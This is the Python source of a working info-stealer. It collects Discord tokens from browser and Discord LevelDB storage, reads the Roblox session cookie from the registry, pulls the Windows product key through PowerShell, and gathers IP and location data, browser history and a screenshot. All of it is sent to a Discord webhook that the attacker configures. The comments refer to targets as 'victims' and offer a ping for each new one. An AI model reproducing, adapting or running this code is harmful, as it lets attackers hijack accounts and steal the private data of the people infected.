import json 
import os
import re
import platform 
import subprocess 
import requests 
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
import pyautogui 
from urllib.request import Request, urlopen
from threading import Thread 
import browser_history
import random,string
flags = json.loads(requests.get('https://raw.githubusercontent.com/matiassingers/emoji-flags/master/data.json').text)
json_flags = {}

LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')
paths = {
        'Discord': ROAMING + '\\Discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Discord PTB': ROAMING + '\\discordptb',
        'Google Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
def robloxcookie():
    try: 
        robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    except:
        return
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                return value
            count = count + 1
    except WindowsError:
        pass
def getPassword():
    password = ""
    for n in range(6):
        password += random.choice(string.digits + string.ascii_lowercase + string.ascii_uppercase)
    return password 
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    if os.path.isdir(path): 
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    return tokens
def clear():
    os.system('cls' if os.name == "nt" else "clear")
WEBHOOK = "WEBHOOK-URL" # WEBHOOK URL HERE 
PING = False # set to True to ping you if there is a new victim! 
def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware',"Vmware"]
    command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
                                stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
                                creationflags=0x08000000)
    out, err = command.communicate()
    command.wait()
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True,rule 
    return False,"PC"
def getIp(): 
    ip = "None"
    try:
        ip = json.loads(urlopen(Request("https://ipinfo.io/json")).read().decode().strip())
    except:
        pass
    return ip
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def histroy():
    requests.post(WEBHOOK,headers=getheaders(),json={"content":"**Working on, Getting user History!**"})
    browsers = ["Firefox","Edge","Brave","Chrome","Opera","Yandex"]
    for browser in browsers: 
        cmd = f"browser-history -b {browser}"
        output = subprocess.Popen(cmd, stderr=subprocess.PIPE,
                                stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
                                creationflags=0x08000000) 
        out, err = output.communicate()
        output.wait()
        t = os.getenv('temp') + "\\"
        open(t + browser + "_History.txt",'a+',encoding="utf-8").write(out)
        requests.post(WEBHOOK,json={"content":""},files={"upload_file": open(t + browser + "_History.txt","r",encoding="utf-8")})
        os.remove(t + browser + "_History.txt")
def getProductKey():
    try:
        wkey = subprocess.check_output(
        r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
    except Exception:
        wkey = "N/A (Likely Pirated)"
    try:
        productName = subprocess.check_output(
        r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
    except Exception:
        productName = "N/A"
    return [productName, wkey]
def main():
    pyautogui.screenshot(f'c:/users/{os.getlogin()}/s.png')
    message = "@everyone" if PING else ""
    checked = []
    embeds = []
    fields = []
    color = 16743424
    for path,item in paths.items():

        tokens = find_tokens(item)
        for token in tokens: 
            info = getuserdata(token)
            if info == None: 
                pass 
            else: 
                if token in checked: 
                    pass 
                else: 
                    email = info.get('email') 
                    phone = info.get('phone')
                    if info.get('email') == None: 
                        email = "No Email added to account. [Mostly like a alt!]"
                    if info.get('phone') == None: 
                        phone = "No Phone Number added to account."
                    embed = {
                        "title":f":star2: Info : ",
                        "author": {
                            "name": info.get('username'),
                            "icon_url": f"https://cdn.discordapp.com/avatars/{info.get('id')}/{info.get('avatar')}",
                            "url": f"https://tokenchecker.freenitrogg.repl.co/?token={token}"
                        },
                        "color": color 
                    }
                    embed.update({"fields": [{
                        "name":"**Token Location : **",
                        "value": path
                    },{
                        "name":"**Username & tag : **",
                        "value": f"``{info.get('username')}#{info.get('discriminator')}``"
                    },{
                        "name": "**Email  : **",
                        "value": f"``{email}``"
                    },{
                        "name": "** Phone : **",
                        "value": f"``{phone}``"
                    },{"name": "** Token : **",
                    "value": f"``{token}``"}]}) 
                    checked.append(token)
                    embeds.append(embed)

    if len(checked) == 0:
        embed = {"title": "**No token grabbed!**","description": "**Sadly**, The Victim dosn't have any valid token logged on pc or The Victim dosn't use discord.","color":color}
        embeds.append(embed)
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({"content": message,"embeds": embeds})
    ip = getIp()
    fields2 = []
    cpu = platform.processor()
    productkey = getProductKey()[1]
    vm = isVM()
    if vm[0] == True: 
        if vm[1] == "VirtualBox":
            vm = f"<:vbox:977896618776993802> {vm[0]}"
        if vm[1] == "vmware" or "Vmware":
            vm = f"<:vmware:977896052885708840>  ``{vm[0]}``"
    else:
        vm = vm[0]
    wos = getProductKey()[0]
    for flag in flags: 
        json_flags.update({flag.get('code'):flag.get('emoji')})
    fields2.append({"name": "IP Info : ","value": f"\n **__IP Adress :__** ``{ip.get('ip')}``\n**__Country__ :** {json_flags.get(ip.get('country'))} ``{ip.get('country')}``\n**__City__** : ``{ip.get('city')}``\n __**location**__ : ``{ip.get('loc')}``"})
    fields2.append({"name": "PC Info : ","value":f"**__Username__ :** ``{os.getlogin()}``\n **__Windows product key :__** ``{productkey}``\n**__Windows OS__** : ``{wos}``\n CPU : ``{cpu}``\n  **__VM :__** : {vm}"})
    embeds2 = [{"title":"Info :","description":":star: **There ya go! This is the victim info.**","fields": fields2,"color": 26367}]
    payload2 = json.dumps({"embeds": embeds2})
    c= robloxcookie()
    if c == None: 
        c = "None."
    else: 
        c = c.split('::<')[3].split('>')[0] 
    payload4 = json.dumps({
        "embeds": [{
            "title": ":money_with_wings: **Roblox Cookie : **",
            "description": ":sparkles: **This is the roblox cookie of the victim.**",
            "fields":[{
                "name":":money_with_wings: Cookie : ",
                "value": "```\n"+c+"```"
            }],
        "color": color}]
    })
    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
    try:
        req = Request(WEBHOOK, data=payload2.encode(), headers=headers)
        urlopen(req)
    except:
        pass
    try:
        req = Request(WEBHOOK, data=payload4.encode(), headers=headers)
        urlopen(req)
    except:
        pass
    h = histroy()
    clear()
    ss()
def ss():
    r = requests.post(WEBHOOK,json={"content": "**Screenshot : **"},files={"upload_file": open(f'c:/users/{os.getlogin()}/s.png','rb')})
    os.remove(f'c:/users/{os.getlogin()}/s.png')
if __name__ == "__main__":
    main()
